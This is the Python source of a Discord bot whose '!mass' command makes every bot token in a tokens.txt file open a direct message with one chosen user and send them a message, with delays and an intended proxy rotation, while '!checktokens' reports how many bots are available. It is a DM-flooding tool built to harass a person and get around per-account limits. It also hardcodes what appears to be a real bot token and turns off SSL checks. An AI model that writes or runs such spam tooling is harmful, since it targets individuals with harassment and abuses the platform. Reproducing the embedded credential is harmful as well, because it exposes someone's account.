import random
import discord
import aiohttp
import asyncio
from discord.ext import commands

intents = discord.Intents.all()
intents.messages = True
bot = commands.Bot(command_prefix='!', intents=intents)

@bot.event
async def on_ready():
    print(f'Logged in as {bot.user.name}')

@bot.command(name='checktokens')
async def check_tokens(ctx):
    with open('tokens.txt', 'r') as file:
        tokens = file.read().splitlines()
    token_count = len(tokens)
    await ctx.send(f'Currently, we have {token_count} amount of bots.')
    
async def send_dm(session, token, user_id, content, delay, proxy):
    headers = {
        'Authorization': f'Bot {token}',
        'Content-Type': 'application/json',
    }
    payload = {
        'recipient_id': user_id,
        'content': content,
    }
    connector = aiohttp.TCPConnector(ssl=False)  # Remove proxy support here (tcpconnector did not work)
    async with aiohttp.ClientSession(connector=connector) as client_session:
        async with client_session.post(f'https://discord.com/api/v10/users/@me/channels', headers=headers, json=payload) as resp:
            data = await resp.json()
            channel_id = data.get('id')

            if channel_id:
                await asyncio.sleep(delay)  
                async with client_session.post(f'https://discord.com/api/v10/channels/{channel_id}/messages', headers=headers, json=payload) as _:
                    pass

@bot.command(name='mass')
async def mass_message(ctx, user: discord.User, delay: float = 1.0, proxy_file: str = 'proxies.txt'):
    tokens = []
    with open('tokens.txt', 'r') as file:
        tokens = file.read().splitlines()

    proxies = []
    try:
        with open(proxy_file, 'r') as proxy_file:
            proxies = proxy_file.read().splitlines()
    except FileNotFoundError:
        await ctx.send(f'The specified proxy file "{proxy_file}" does not exist.')
        return

    async with aiohttp.ClientSession() as session:
        tasks = [send_dm(session, token, user.id, "d", delay, random.choice(proxies)) for token in tokens]
        await asyncio.gather(*tasks)

    await ctx.send(f'Mass messages sent to {user.name}')


bot.run('MTE5NjE1MDA0NDEzMTMzNjQxMw.GxuwUf.Xm8nAjtEV42qwL9a9Z4uoRjjjtDhgKK7Cw8sjI')
